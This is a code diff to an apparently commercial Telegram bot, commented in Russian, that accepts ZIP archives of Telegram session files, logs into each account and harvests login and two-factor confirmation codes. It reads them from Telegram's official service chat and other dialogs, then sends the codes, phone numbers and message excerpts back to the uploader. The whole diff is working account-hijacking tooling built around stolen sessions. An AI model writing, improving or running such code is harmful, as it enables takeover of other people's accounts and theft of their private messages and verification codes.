@@ -1938,6 +1938,78 @@ def referral_keyboard() -> InlineKeyboardMarkup:
     ]
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
+async def get_codes_from_session_file_v2(client: TelegramClient, limit: int = 10) -> List[Dict]:
+    """
+    Получает коды из уже подключенного клиента.
+    """
+    codes = []
+    try:
+        logger.info("🔍 Ищу коды в аккаунте...")
+        
+        # Ищем сообщения с кодами (от 777000 - официальный бот Telegram)
+        async for message in client.iter_messages(777000, limit=100):
+            if not message.text:
+                continue
+
+            text_lower = message.text.lower()
+            found_codes = re.findall(r'\b(\d{4,8})\b', message.text)
+
+            for code in found_codes:
+                if len(code) > 6:
+                    continue
+                    
+                # Определяем тип кода
+                if any(word in text_lower for word in ['2fa', 'пароль', 'password', 'two-step']):
+                    code_type = "🔒 2FA"
+                elif any(word in text_lower for word in ['code', 'код', 'login', 'вход', 'confirmation']):
+                    code_type = "🔐 Telegram"
+                else:
+                    continue
+
+                msg_date = message.date.strftime("%d.%m.%Y %H:%M")
+                codes.append({
+                    'code': code,
+                    'type': code_type,
+                    'date': msg_date,
+                    'text': message.text[:100]
+                })
+                
+                if len(codes) >= limit:
+                    break
+                    
+            if len(codes) >= limit:
+                break
+        
+        # Если не нашли в 777000, ищем во всех диалогах
+        if not codes:
+            logger.info("Не найдено в 777000, ищу во всех диалогах...")
+            async for message in client.iter_messages(None, limit=200):
+                if not message.text:
+                    continue
+                    
+                text_lower = message.text.lower()
+                if 'login code' in text_lower or 'код подтверждения' in text_lower:
+                    found_codes = re.findall(r'\b(\d{4,8})\b', message.text)
+                    for code in found_codes:
+                        if 4 <= len(code) <= 6:
+                            codes.append({
+                                'code': code,
+                                'type': "🔐 Telegram",
+                                'date': message.date.strftime("%d.%m.%Y %H:%M"),
+                                'text': message.text[:100]
+                            })
+                            if len(codes) >= limit:
+                                break
+                if len(codes) >= limit:
+                    break
+        
+        logger.info(f"✅ Найдено кодов: {len(codes)}")
+        return codes[:limit]
+        
+    except Exception as e:
+        logger.error(f"❌ Ошибка получения кодов: {e}")
+        return []
+        
 async def get_codes_from_session_file(session_path: str, limit: int = 5) -> List[Dict]:
     """
     Подключается к аккаунту по бинарному .session файлу и получает последние коды.
@@ -3174,17 +3246,9 @@ async def process_zip_file(zip_bytes: bytes) -> list:
     Поддерживает:
     - .session (SQLite файл)
     - .session.txt (StringSession)
-
-    Возвращает список:
-    [
-        {
-            "type": "file" или "string",
-            "session": путь_или_строка,
-            "phone": номер
-        }
-    ]
     """
     results = []
+    temp_files = []  # Для очистки
 
     try:
         with zipfile.ZipFile(io.BytesIO(zip_bytes)) as z:
@@ -3198,18 +3262,32 @@ async def process_zip_file(zip_bytes: bytes) -> list:
                 with z.open(file_name) as f:
                     content = f.read()
 
-                # 🔹 1. ОБЫЧНЫЙ .session (sqlite)
+                # Обычный .session (sqlite)
                 if file_name.endswith(".session"):
                     try:
-                        # сохраняем во временный файл
+                        # Сохраняем во временный файл
+                        import tempfile
                         temp_dir = tempfile.gettempdir()
-                        temp_path = os.path.join(temp_dir, os.path.basename(file_name))
-
+                        temp_path = os.path.join(temp_dir, f"temp_session_{hash(file_name)}.session")
+                        
                         with open(temp_path, "wb") as temp_file:
                             temp_file.write(content)
-
-                        # достаем номер
+                        
+                        temp_files.append(temp_path)
+                        
+                        # Пытаемся извлечь номер из имени файла или из сессии
                         phone = os.path.basename(file_name).replace(".session", "")
+                        if not phone or phone == "session":
+                            # Пробуем прочитать из файла
+                            try:
+                                client = TelegramClient(temp_path, API_ID, API_HASH)
+                                await client.connect()
+                                if await client.is_user_authorized():
+                                    me = await client.get_me()
+                                    phone = me.phone or phone
+                                await client.disconnect()
+                            except:
+                                pass
 
                         results.append({
                             "type": "file",
@@ -3218,23 +3296,23 @@ async def process_zip_file(zip_bytes: bytes) -> list:
                         })
 
                     except Exception as e:
-                        print(f"Ошибка обработки .session: {e}")
+                        logger.error(f"Ошибка обработки .session: {e}")
 
-                # 🔹 2. StringSession (.session.txt)
+                # StringSession (.session.txt)
                 elif file_name.endswith(".session.txt"):
                     try:
                         session_string = content.decode().strip()
-
                         phone = os.path.basename(file_name).replace(".session.txt", "")
-
-                        results.append({
-                            "type": "string",
-                            "session": session_string,
-                            "phone": phone
-                        })
-
+                        
+                        # Проверяем, что строка валидная
+                        if session_string and len(session_string) > 10:
+                            results.append({
+                                "type": "string",
+                                "session": session_string,
+                                "phone": phone
+                            })
                     except Exception as e:
-                        print(f"Ошибка обработки .session.txt: {e}")
+                        logger.error(f"Ошибка обработки .session.txt: {e}")
 
         if not results:
             raise Exception(f"❌ В ZIP архиве не найден файл .session.\n\nНайдены файлы: {', '.join(file_list)}")
@@ -3316,21 +3394,21 @@ async def handle_zip(message: types.Message, state: FSMContext):
     try:
         document = message.document
 
-        # 🔒 Проверяем формат
+        # Проверяем формат
         if not document.file_name.lower().endswith(".zip"):
             await message.answer("❌ Отправь ZIP архив с сессиями")
             return
 
         await message.answer("📦 Загружаю архив...")
 
-        # 📥 скачиваем файл
+        # Скачиваем файл
         file = await bot.get_file(document.file_id)
         file_bytes = await bot.download_file(file.file_path)
         zip_bytes = file_bytes.read()
 
         await message.answer("🔍 Обрабатываю...")
 
-        # 🔥 обрабатываем ZIP
+        # Обрабатываем ZIP
         sessions = await process_zip_file(zip_bytes)
 
         if not sessions:
@@ -3338,64 +3416,85 @@ async def handle_zip(message: types.Message, state: FSMContext):
             return
 
         result_text = f"✅ Найдено сессий: {len(sessions)}\n\n"
-
         all_codes_text = ""
 
         for s in sessions:
             phone = s.get("phone", "unknown")
-
+            
             try:
-                # 🔹 подключение
+                # Создаем временную директорию для сессии
+                import tempfile
+                temp_dir = tempfile.mkdtemp()
+                
+                # Подключение
                 if s["type"] == "file":
-                    client = TelegramClient(s["session"], API_ID, API_HASH)
+                    # Копируем временный файл в новую директорию
+                    import shutil
+                    temp_session_path = os.path.join(temp_dir, os.path.basename(s["session"]))
+                    shutil.copy2(s["session"], temp_session_path)
+                    client = TelegramClient(temp_session_path, API_ID, API_HASH)
                 else:
                     client = TelegramClient(StringSession(s["session"]), API_ID, API_HASH)
 
                 await client.connect()
-
+                
+                # Проверяем авторизацию
                 if not await client.is_user_authorized():
                     result_text += f"📱 {phone} — ❌ не авторизована\n"
                     await client.disconnect()
                     continue
-
-                # 🔥 получаем коды
-                codes = await get_codes_from_session(
-                    s["session"] if s["type"] == "string" else None
-                ) if s["type"] == "string" else await get_codes_from_session_file(s["session"])
-
+                
+                # Получаем информацию об аккаунте для проверки
+                me = await client.get_me()
+                result_text += f"📱 {phone} — ✅ авторизован (@{me.username or me.first_name})\n"
+                
+                # Получаем коды
+                codes = await get_codes_from_session_file_v2(client, limit=10)
+                
                 await client.disconnect()
+                
+                # Удаляем временную папку
+                import shutil
+                shutil.rmtree(temp_dir, ignore_errors=True)
 
                 if not codes:
-                    result_text += f"📱 {phone} — ⚠️ кодов нет\n"
+                    result_text += f"   ⚠️ кодов не найдено\n"
                     continue
 
-                result_text += f"📱 {phone} — ✅ {len(codes)} кодов\n"
+                result_text += f"   ✅ найдено {len(codes)} кодов\n\n"
 
                 for c in codes:
                     all_codes_text += (
                         f"📱 {phone}\n"
-                        f"{c['type']} {c['code']}\n"
-                        f"🕒 {c['date']}\n\n"
+                        f"{c['type']} <code>{c['code']}</code>\n"
+                        f"🕒 {c['date']}\n"
+                        f"📝 {c.get('text', '')[:100]}\n\n"
                     )
 
             except Exception as e:
-                result_text += f"📱 {phone} — ❌ ошибка\n"
-                print(f"Ошибка с {phone}: {e}")
+                result_text += f"📱 {phone} — ❌ ошибка: {str(e)[:100]}\n"
+                logger.error(f"Ошибка с {phone}: {e}")
+                continue
 
-        # 📊 отправляем результат
+        # Отправляем результат
         await message.answer(result_text[:4000])
 
         if all_codes_text:
-            await message.answer(
-                f"🔑 КОДЫ:\n\n{all_codes_text[:4000]}"
-            )
+            # Разбиваем на части, если текст слишком длинный
+            if len(all_codes_text) > 4000:
+                for i in range(0, len(all_codes_text), 4000):
+                    await message.answer(f"🔑 КОДЫ:\n\n{all_codes_text[i:i+4000]}")
+            else:
+                await message.answer(f"🔑 КОДЫ:\n\n{all_codes_text}")
         else:
-            await message.answer("❌ Коды не найдены")
+            await message.answer("❌ Коды не найдены. Возможно, аккаунт новый и ещё не получал коды.")
 
         await state.clear()
 
     except Exception as e:
         await message.answer(f"❌ Ошибка: {str(e)}")
+        logger.error(f"Ошибка в handle_zip: {e}")
+        traceback.print_exc()
         await state.clear()
 # ==================== АДМИНСКИЕ ОБРАБОТЧИКИ ПЛАТЕЖЕЙ ====================
 @dp.callback_query(lambda c: c.data.startswith('send_details_'))
